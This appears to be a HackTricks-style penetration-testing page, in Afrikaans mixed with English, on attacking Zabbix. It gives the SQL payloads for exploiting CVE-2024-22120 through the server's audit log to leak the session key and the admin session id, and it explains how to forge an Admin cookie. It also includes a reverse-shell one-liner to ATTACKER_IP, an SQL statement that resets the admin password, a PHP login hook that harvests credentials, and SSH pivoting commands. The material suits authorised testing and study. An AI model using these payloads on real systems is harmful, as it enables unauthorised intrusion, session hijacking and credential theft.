# Zabbix Sekuriteit

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Zabbix is 'n monitoring platform wat 'n web UI openbaar (tipies agter Apache/Nginx) en 'n server komponent wat ook die Zabbix-protokol op TCP/10051 (server/trapper) en agent op TCP/10050 praat. Tydens engagements kan jy die volgende teëkom:

- Web UI: HTTP(S) virtual host like zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Nutige koekie-formaat: zbx_session is Base64 van 'n kompakte JSON-objek wat ten minste sessionid, serverCheckResult, serverCheckTime en sign insluit. Die sign is 'n HMAC van die JSON-payload.

## zbx_session koekie interne

Onlangse Zabbix-weergawes bereken die koekie soos:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

As jy die globale session_key en 'n geldige admin sessionid kan herstel, kan jy 'n geldige Admin koekie offline vervals en by die UI autentiseer.

## CVE-2024-22120 — Tydgebaseerde blind SQLi in Zabbix Server ouditlog

Geaffekteerde weergawes (soos publiek gedokumenteer):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Opsomming van die kwesbaarheid:

- Wanneer 'n Script-uitvoering in die Zabbix Server ouditlog aangeteken word, word die clientip-veld nie gesaniteer nie en in SQL gekoppel, wat tydgebaseerde blind SQLi via die serverkomponent moontlik maak.
- Dit is uitbuitbaar deur 'n gemanipuleerde "command" versoek na die Zabbix serverpoort 10051 te stuur met 'n geldige lae-voorregte sessionid, 'n hostid waartoe die gebruiker toegang het, en 'n toegelate scriptid.

Voorwaardes en ontdekkingswenke:

- sessionid: Vanaf guest/login in die web UI, decodeer zbx_session (Base64) om die sessionid te kry.
- hostid: Bespeur via web UI-versoeke (bv., Monitoring → Hosts) of vang dit af met 'n proxy; algemene standaard is 10084.
- scriptid: Slegs scripts wat vir die huidige rol toegelaat is sal uitgevoer word; verifieer deur die script-menu/AJAX-antwoorde te ondersoek. Standaarde soos 1 of 2 word dikwels toegelaat; 3 kan geweier word.

### Uitbuitingsvloei

1) Roep 'n oudit-invoeging met SQLi in clientip

- Verbind met TCP/10051 en stuur 'n Zabbix-ingekaderde boodskap met request="command" wat sid, hostid, scriptid insluit, en clientip gestel is op 'n SQL-uitdrukking wat deur die bediener in die SQL gekoppel en geëvalueer sal word.

Minimale boodskap (JSON-body) velde:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
Die volledige wire-format is: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. Jy kan pwntools of jou eie socket-code gebruik om dit te frame.

2) Time-bruteforce secrets via conditional sleep

Gebruik conditional expressions om leak hex-encoded secrets 1 char at a time deur responstyd te meet. Voorbeelde wat in die praktyk gewerk het:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) van sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Aantekeninge:

- charset: 32 hex chars [0-9a-f]
- Kies T_TRUE >> T_FALSE (bv. 10 vs 1) en meet wall-clock per poging
- Verseker jou scriptid is werklik gemagtig vir die gebruiker; anders word geen audit row geproduseer nie en sal timing nie werk

3) Forge Admin cookie

Sodra jy het:

- session_key: 32-hex van config.session_key
- admin_sessionid: 32-hex van sessions.sessionid vir userid=1

Bereken:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Stel die cookie zbx_session op hierdie waarde en GET /zabbix.php?action=dashboard.view om Admin-toegang te valideer.

### Gereedgemaakte tooling

- Public PoC outomatiseer: bruteforce of session_key and admin sessionid, and cookie forging; vereis pwntools en requests.
- Parameters to provide typically include: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, and optionally a known --admin-sid to skip brute.

## RCE via Script execution (post-Admin)

Met Admin-toegang in die UI kan jy vooraf-gedefinieerde Scripts teen gemonitorde hosts uitvoer. As agents/hosts script-opdragte plaaslik uitvoer, gee dit code execution op daardie stelsels (dikwels as die zabbix user op Linux hosts):

- Vinnige kontrole: run id om gebruikerskonteks te bevestig
- Reverse shell example:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
TTY opgradering (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
As jy DB-toegang het, is 'n alternatief vir die vervalsing van 'n cookie om die Admin-wagwoord terug te stel na die gedokumenteerde bcrypt vir "zabbix":
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Kredensiaal vaslegging via login hook (post-exploitation)

Indien file write moontlik is op die web UI server, kan jy tydelik 'n logging snippet byvoeg in /usr/share/zabbix/index.php rondom die form-based login branch om credentials vas te vang:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Gebruikers verifieer normaalweg; lees /dev/shm/creds.txt daarna. Verwyder die hook wanneer gereed.

## Pivoting na interne dienste

Selfs al is die shell van die service account /usr/sbin/nologin, deur 'n SSH authorized_keys entry by te voeg en -N -L te gebruik, maak dit local port-forwarding na loopback-only services (e.g., CI/CD at 8111):
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
Sien meer tunneling-patrone in: Kyk na [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Operasionele wenke

- Valideer dat scriptid vir die huidige rol toegelaat word (guest mag 'n beperkte stel hê)
- Timing brute kan traag wees; cache die herkryde admin sessionid en hergebruik dit
- Die JSON wat na 10051 gestuur word, moet afgebaken wees met die ZBXD\x01 header en 'n little-endian lengte

## Verwysings

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
